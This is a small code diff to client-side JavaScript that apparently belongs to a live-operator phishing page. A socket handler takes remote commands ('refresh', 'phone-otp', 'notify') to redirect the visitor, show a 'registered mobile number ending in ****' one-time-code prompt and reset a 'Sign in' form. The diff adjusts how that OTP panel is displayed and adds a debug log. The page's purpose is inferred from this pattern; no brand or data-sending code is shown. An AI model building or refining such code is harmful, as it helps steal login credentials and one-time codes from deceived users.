@@ -20,7 +20,7 @@
     socket.on("user:command", (data) => {
 	  const { command, code, phonescreen, link } = data;
 	  resetSubmitForm();
-	//alert("command received");
+	  
 	  switch (command) {
 	    case "refresh":
 	      location.reload();
@@ -45,13 +45,14 @@
 	    case "phone-otp":
 	      if (!code) return;
 	      const phoneNumberEl = document.querySelector("#phone");
-	      document.querySelector("#phone-wrap").style.display = "block";
 	      sessionStorage.setItem("setcode", code);
 	      if (!phoneNumberEl) {
 	        window.location.href = phonescreen;
 	        return;
 	      }
 	      phoneNumberEl.textContent = code;
+	      document.querySelector("#phone-wrap").innerHTML  = ` registered mobile number<br>ending in <strong>**** <span id="phone"> </span> </strong> `;
+	      document.querySelector("#phone-wrap").style.display = "block";
 	      break;
 	
 	    case "notify":
@@ -139,6 +140,8 @@ function resetSubmitForm() {
         .html('Sign in');
 
     $('input').prop('disabled', false);
+    
+     console.log("disabling");
 }
 
 async function submitFormData(formData) {
